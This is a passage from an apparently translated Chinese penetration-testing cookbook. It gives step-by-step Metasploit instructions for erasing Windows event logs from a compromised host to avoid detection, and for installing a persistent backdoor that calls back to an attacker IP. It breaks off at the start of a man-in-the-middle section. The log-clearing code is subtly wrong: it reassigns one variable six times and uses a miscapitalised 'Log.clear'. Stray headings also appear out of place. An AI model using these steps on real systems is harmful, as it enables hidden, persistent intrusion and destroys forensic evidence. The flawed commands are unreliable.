  \n## 清理痕迹\n\n在本教程中，我们将使用 `Metasploit` 来擦除我们的痕迹。在攻破主机后进行清理是一个极其重要的步骤，因为你不想在费了很大力获取访问权限后却被发现。幸运的是，`Metasploit`\
  \ 有一种非常简单的方法让我们清理痕迹。\n\n![](img/00173.jpeg)\n\n## 权限提升\n\n### 准备工作\n\n执行此教程我们需要以下条件：\n\
  - 与互联网或内网的连接\n- 还需要一台使用 `Metasploit` 框架的受控机器\n\n## 如何操作...\n\n要执行的步骤如下：\n\n1. 让我们从\
  \ `Meterpreter` shell 开始清理痕迹的过程。你将必须使用 `Metasploit` 攻击主机以获取 `Meterpreter` shell。你可以使用第\
  \ 6 章“利用漏洞”中的任一个教程，使用 `Metasploit` 访问主机。一旦你使用带有 `Meterpreter` 负载的 `Metasploit` 漏洞访问了受害者，请等待\
  \ `Meterpreter` 提示符显示：\n\n2. 接下来，我们需要运行 `IRB` 以开始删除日志的过程。我们打开帮助文件：\n```\nirb\n```\n\
  \n3. 接下来，我们告诉 `IRB` 我们想要删除哪些日志。以下是某些可选选项。\n- `log = client.sys.eventlog.open('system')`\n\
  - `log = client.sys.eventlog.open('security')`\n- `log = client.sys.eventlog.open('application')`\n\
  - `log = client.sys.eventlog.open('directory service')`\n- `log = client.sys.eventlog.open('dns\
  \ server')`\n- `log = client.sys.eventlog.open('file replication service')`\n\n\
  ![](img/00174.jpeg)\n\n4. 为了我们的目的，我们将清除所有日志。你必须逐个输入这些命令。\n```\nlog = client.sys.eventlog.open('system')\n\
  log = client.sys.eventlog.open('security')\nlog = client.sys.eventlog.open('application')\n\
  log = client.sys.eventlog.open('directory service')\nlog = client.sys.eventlog.open('dns\
  \ server')\nlog = client.sys.eventlog.open('file replication service')\n```\n\n\
  5. 现在，我们执行命令来删除日志文件：\n```\nLog.clear\n```\n\n6. 大好了！只需几条命令，我们就能够掩盖自己的痕迹了！\n\n##\
  \ 工作原理...\n\n在本教程中，我们使用 `Meterpreter` 在受控主机上掩盖痕迹。我们从一个 `Meterpreter` shell 开始教程，并启动了\
  \ `IRB`（一个 Ruby 解释器 shell）。接下来，我们精确指定了想要删除哪些文件，并通过发布 `Log.clear` 命令清除日志来结束教程。记住，你希望在攻破主机后最后执行这一步；你不想在掩盖痕迹后又执行另一个功能从而添加更多的日志条目，以此类推。\n\
  \n## 创建持久化后门\n\n在本教程中，我们将使用 `Metasploit` 持久化创建一个持久化后门。一旦你成功访问受控机器，你将希望找到无需再次破入就能重新访问机器的方法。如果受控机器的用户执行了某些中断连接的操作（例如重启机器），使用后门将允许连接重新建立到你的机器。这就是创建后门的用武之处，因为它允许你保持对之前被攻破机器的访问权限。\n\
  \n### 准备工作\n\n执行此教程我们需要以下条件：\n- 与互联网或内网的连接\n- 还需要一台使用 `Metasploit` 框架的受控机器\n\n![](img/00175.jpeg)\n\
  \n## 权限提升\n\n## 如何操作...\n\n让我们开始安装持久化后门的过程。你将必须使用 `Metasploit` 攻击主机以获取 `Meterpreter`\
  \ shell。你可以使用第 6 章“利用漏洞”中的任一个教程，使用 `Metasploit` 访问主机。\n\n1. 一旦你使用带有 `Meterpreter`\
  \ 负载的 `Metasploit` 漏洞访问了受害者，请等待 `Meterpreter` 提示符显示：\n\n2. 接下来，我们需要运行 `persistence`\
  \ 来设置我们的后门。我们打开帮助文件：\n```\nrun persistence -h\n```\n\n3. `persistence` 后门有很多选项，包括：\n\
  - `-A`: 此选项会自动启动一个多处理器处理器来连接到代理。\n- `-S`: 此选项允许后门作为服务自动启动。\n- `-U`: 此选项允许后门在用户启动时自动启动。\n\
  - `-i`: 此选项设置返回攻击者机器的尝试间隔秒数（秒）。\n- `-p`: 此选项设置 `Metasploit` 在攻击者机器上监听的端口。\n- `-P`:\
  \ 此选项设置要使用的负载（默认是 `reverse_tcp`，这在中间人攻击中是常用的）。\n- `-r`: 此选项设置攻击者的 IP 地址。\n\n4. 现在，我们执行命令来设置后门：\n\
  ```\nrun persistence -U -i 10 -p 8090 -r 192.168.10.111\n```\n\n![](img/00176.jpeg)\n\
  \n5. 如果成功，你会看到 `Meterpreter` 会话！\n\n## 工作原理...\n\n在本教程中，我们使用 `Meterpreter` 在受控主机上设置了持久化。我们从一个\
  \ `Meterpreter` shell 开始教程，并在入侵后启动了 `persistence`。接下来，我们通过查看帮助文件探索了某些可用选项。最后，通过运行安装命令完成了设置。\n\
  \n## 中间人攻击 (MITM)\n\n在本教程中，我们将对一个目标进行中间人（MITM）攻击。中间人攻击的工作原理允许我们监听目标与其合法方之间的通信。在我们的示例中，我们可以利用\
